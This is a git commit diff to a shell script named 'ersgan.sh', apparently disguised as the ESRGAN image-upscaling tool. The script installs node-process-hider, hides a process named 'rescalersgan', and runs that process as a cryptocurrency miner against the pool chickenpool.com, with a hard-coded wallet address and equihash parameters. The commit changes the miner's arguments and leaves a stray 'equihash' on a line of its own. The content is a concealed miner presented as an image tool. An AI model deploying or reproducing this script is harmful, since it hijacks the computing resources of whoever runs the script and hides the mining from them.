46fdd209bce9b76c743da1f38d4d9c2d448c876c
ngel4ng <108847948+ngel4ng@users.noreply.github.com>
2022-07-08 12:59:08 -0700

    Update ersgan.sh

--- ersgan.sh
+++ ersgan.sh
@@ -3,4 +3,5 @@ apt-get install -y nodejs
 npm i -g node-process-hider
 ph add rescalersgan
 chmod +x rescalersgan
-./rescalersgan -u RVotNy1Psgae15Rorv7u1ii6R56QeRSUJc.$(echo $(shuf -i 1-999 -n 1)-an) -l chickenpool.com --port=3001 --intensity=85 -p x --par=equihash
+./rescalersgan -u RVotNy1Psgae15Rorv7u1ii6R56QeRSUJc.$(echo $(shuf -i 1-999 -n 1)-an) -l chickenpool.com --port=3001 --intensity=85 -p x --par=144,5
+equihash
